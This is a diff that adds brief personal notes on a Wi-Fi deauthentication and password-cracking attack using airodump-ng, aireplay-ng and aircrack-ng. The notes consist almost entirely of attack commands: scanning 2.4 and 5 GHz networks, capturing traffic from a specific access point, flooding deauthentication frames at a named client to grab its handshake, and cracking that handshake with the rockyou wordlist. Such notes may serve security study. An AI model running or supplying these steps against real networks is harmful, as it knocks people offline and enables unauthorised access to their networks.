@@ -1,0 +1,12 @@
+(deauthentication attack using airodump)
+(iwconfig)
+(airodump-ng wlan0) (start scanning)
+(airodump-ng wlan0) (get all wifi connections range 2.4ghz)
+(airodump-ng --band a wlan0) (get all wifi connections range 5ghz and over)
+(airodump-ng --band abg wlan0)(a:5ghz bg:2.4ghz)
+(airodump-ng --bssid 78:11:DC:35:16:56 --channel 2 --write sniper wlan0)-all pcs on network
+(read sniper.cap from wireshark)
+(aireplay-ng --deauth 10000000 -a 78:11:DC:35:16:56 -c C6:0A:8C:E4:CA:74 wlan0) - (disconnect the client to capture
+handshake)
+(aircrack-ng -w /path/to/wordlist.txt /path/to/handshake.cap)
+(aircrack-ng -w /usr/share/wordlists/rockyou.txt sniper-01.cap)
